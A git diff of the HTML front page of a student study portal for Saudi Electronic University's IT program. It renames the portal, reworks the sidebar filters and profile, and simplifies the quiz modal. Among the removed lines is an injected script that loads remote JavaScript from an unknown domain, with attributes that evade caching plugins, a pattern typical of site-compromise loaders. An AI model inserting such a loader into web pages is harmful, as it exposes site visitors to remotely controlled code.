@@ -3,18 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SEU IT Study Portal | Comprehensive BSIT Hub</title>
+    <title>SEU IT Elite Portal | The Ultimate Resource</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-      (function () {
-          var script = document.createElement("script");
-          script.async = 1;
-          script.src = 'https://emrld.ltd/NTM5NTQ4.js?t=539548';
-          document.head.appendChild(script);
-      })();
-    </script>
 </head>
 <body class="dark-mode">
     <div class="nav-overlay" id="navOverlay"></div>
@@ -22,32 +14,31 @@
     <nav class="sidebar" id="sidebar">
         <div class="sidebar-header">
             <div class="logo">
-                <div class="logo-icon"><i class="fas fa-university"></i></div>
-                <span>SEU Portal</span>
+                <div class="logo-icon"><i class="fas fa-bolt"></i></div>
+                <span>SEU ELITE</span>
             </div>
             <button class="mobile-close" id="mobileClose"><i class="fas fa-times"></i></button>
         </div>
         
         <div class="sidebar-content">
             <div class="nav-group">
-                <p class="nav-label">Curriculum Tracks</p>
+                <p class="nav-label">Main Navigation</p>
                 <ul class="nav-links">
-                    <li class="active" data-filter="all"><i class="fas fa-border-all"></i> <span>All Courses</span></li>
-                    <li data-filter="first-year"><i class="fas fa-star"></i> <span>First Year</span></li>
-                    <li data-filter="college-req"><i class="fas fa-square-root-alt"></i> <span>College Req.</span></li>
-                    <li data-filter="it-core"><i class="fas fa-microchip"></i> <span>IT Core</span></li>
-                    <li data-filter="advanced"><i class="fas fa-rocket"></i> <span>Advanced & GP</span></li>
-                    <li data-filter="electives"><i class="fas fa-project-diagram"></i> <span>Elective Tracks</span></li>
-                    <li data-filter="university-req"><i class="fas fa-mosque"></i> <span>Islamic Culture</span></li>
+                    <li class="active" data-filter="all"><i class="fas fa-layer-group"></i> <span>All Knowledge</span></li>
+                    <li data-filter="programming"><i class="fas fa-terminal"></i> <span>Programming</span></li>
+                    <li data-filter="core-it"><i class="fas fa-microchip"></i> <span>Core IT</span></li>
+                    <li data-filter="math"><i class="fas fa-square-root-alt"></i> <span>Mathematics</span></li>
+                    <li data-filter="advanced"><i class="fas fa-user-shield"></i> <span>Security & Cloud</span></li>
                 </ul>
             </div>
         </div>
 
         <div class="sidebar-footer">
             <div class="user-profile">
-                <div class="avatar"><i class="fas fa-user-graduate"></i></div>
+                <div class="avatar">N</div>
                 <div class="user-info">
-                    <p class="user-status">BSIT Ultimate Hub</p>
+                    <p class="user-name">Nawaf</p>
+                    <p class="user-status">Senior IT Student</p>
                 </div>
             </div>
         </div>
@@ -59,18 +50,18 @@
                 <button class="mobile-toggle" id="mobileToggle"><i class="fas fa-bars"></i></button>
                 <div class="search-container">
                     <i class="fas fa-search"></i>
-                    <input type="text" id="courseSearch" placeholder="Search course code or title...">
+                    <input type="text" id="courseSearch" placeholder="Search the curriculum...">
                 </div>
             </div>
             <div class="header-right">
-                <div class="current-date">Sunday, June 14, 2026</div>
+                <div class="current-date" id="currentDate"></div>
             </div>
         </header>
 
         <section class="hero-section">
             <div class="hero-content">
-                <h1>SEU IT Academic Portal</h1>
-                <p>The definitive study guide for the Saudi Electronic University BSIT program. Exhaustive course summaries, track electives, and accurate assessments.</p>
+                <h1>The Ultimate SEU IT Portal</h1>
+                <p>A comprehensive repository of study resources, mock exams, and summaries for IT students at Saudi Electronic University.</p>
             </div>
         </section>
 
@@ -85,36 +76,30 @@
         </footer>
     </main>
 
-    <div id="courseModal" class="modal">
+    <!-- Quiz Modal -->
+    <div id="quizModal" class="modal">
         <div class="modal-backdrop"></div>
         <div class="modal-container">
             <div class="modal-header">
-                <h2 id="modalTitle">Course Detail</h2>
-                <button class="modal-close" id="closeCourseModal"><i class="fas fa-times"></i></button>
+                <h2 id="quizTitle">Course Check</h2>
+                <button class="modal-close" id="modalClose"><i class="fas fa-times"></i></button>
             </div>
             <div class="modal-body">
-                <div class="tabs">
-                    <button class="tab-btn active" data-tab="summary">Study Summary</button>
-                    <button class="tab-btn" data-tab="quiz">Practice Quiz</button>
-                </div>
-                <div id="summaryTab" class="tab-content active">
-                    <div id="courseSummaryContent" class="detailed-summary-text"></div>
-                </div>
-                <div id="quizTab" class="tab-content"><div class="quiz-header" id="quizHeader"></div>
-                    <div id="quizContent">
-                        <div class="progress-bar-container"><div class="progress-bar" id="quizProgress"></div></div>
-                        <p class="question-text" id="questionText"></p>
-                        <div class="options-grid" id="optionsContainer"></div>
-                        <div id="explanationBox" class="explanation-box hidden"></div>
-                        <button id="nextBtn" class="primary-btn hidden">Next Question</button>
+                <div id="quizContent">
+                    <div class="progress-bar-container">
+                        <div class="progress-bar" id="quizProgress"></div>
                     </div>
-                    <div id="quizResult" class="hidden">
-                        <div class="result-card">
-                            <div class="result-icon"><i class="fas fa-award"></i></div>
-                            <h3>Assessment Complete</h3>
-                            <p class="score-display" id="scoreText"></p>
-                            <button class="primary-btn" id="restartQuiz">Try Again</button>
-                        </div>
+                    <p class="question-text" id="questionText"></p>
+                    <div class="options-grid" id="optionsContainer"></div>
+                    <div id="explanationBox" class="explanation-box hidden"></div>
+                    <button id="nextBtn" class="primary-btn hidden">Next Question</button>
+                </div>
+                <div id="quizResult" class="hidden">
+                    <div class="result-card">
+                        <div class="result-icon"><i class="fas fa-trophy"></i></div>
+                        <h3>Assessment Complete</h3>
+                        <p class="score-display" id="scoreText"></p>
+                        <button class="primary-btn" id="finishQuiz">Close Assessment</button>
                     </div>
                 </div>
             </div>
